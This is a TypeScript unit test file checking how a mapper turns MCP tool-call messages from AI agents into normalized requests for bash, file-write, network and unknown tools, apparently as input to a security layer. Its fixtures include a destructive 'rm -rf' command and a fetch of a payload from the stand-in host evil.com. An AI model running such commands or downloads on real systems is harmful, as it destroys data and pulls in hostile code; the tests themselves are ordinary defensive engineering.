import { describe, expect, it } from "vitest";
import { mapToToolRequest } from "../mapper.js";
import type { McpToolCallInput } from "../types.js";

describe("mapToToolRequest", () => {
	it("maps bash tool correctly with agent=mcp", () => {
		const input: McpToolCallInput = {
			jsonrpc: "2.0",
			id: "req-1",
			method: "tools/call",
			params: {
				name: "bash",
				arguments: { command: "rm -rf /tmp/test" },
			},
		};
		const req = mapToToolRequest(input);
		expect(req.tool).toBe("bash");
		expect(req.content).toBe("rm -rf /tmp/test");
		expect(req.context.agent).toBe("mcp");
		expect(req.context.session_id).toBe("req-1");
	});

	it("maps namespaced tool (strips prefix: filesystem/write_file -> file_write)", () => {
		const input: McpToolCallInput = {
			jsonrpc: "2.0",
			id: 42,
			method: "tools/call",
			params: {
				name: "filesystem/write_file",
				arguments: { path: "/tmp/out.txt", content: "hello" },
			},
		};
		const req = mapToToolRequest(input);
		expect(req.tool).toBe("file_write");
		expect(req.content).toBe("/tmp/out.txt");
	});

	it("maps network tools", () => {
		const input: McpToolCallInput = {
			jsonrpc: "2.0",
			id: "req-3",
			method: "tools/call",
			params: {
				name: "fetch",
				arguments: { url: "https://evil.com/payload" },
			},
		};
		const req = mapToToolRequest(input);
		expect(req.tool).toBe("network");
		expect(req.content).toBe("https://evil.com/payload");
	});

	it("maps unknown tool", () => {
		const input: McpToolCallInput = {
			jsonrpc: "2.0",
			id: "req-4",
			method: "tools/call",
			params: {
				name: "custom_database_query",
				arguments: { query: "SELECT * FROM users" },
			},
		};
		const req = mapToToolRequest(input);
		expect(req.tool).toBe("unknown");
		expect(req.content).toContain("SELECT * FROM users");
	});

	it("extracts content from arguments.command for bash-type tools", () => {
		const input: McpToolCallInput = {
			jsonrpc: "2.0",
			id: "req-5",
			method: "tools/call",
			params: {
				name: "shell",
				arguments: { command: "echo hello" },
			},
		};
		const req = mapToToolRequest(input);
		expect(req.tool).toBe("bash");
		expect(req.content).toBe("echo hello");
	});

	it("extracts content from arguments.url for network-type tools", () => {
		const input: McpToolCallInput = {
			jsonrpc: "2.0",
			id: "req-6",
			method: "tools/call",
			params: {
				name: "http_request",
				arguments: { url: "https://api.example.com/data", method: "GET" },
			},
		};
		const req = mapToToolRequest(input);
		expect(req.tool).toBe("network");
		expect(req.content).toBe("https://api.example.com/data");
	});
});
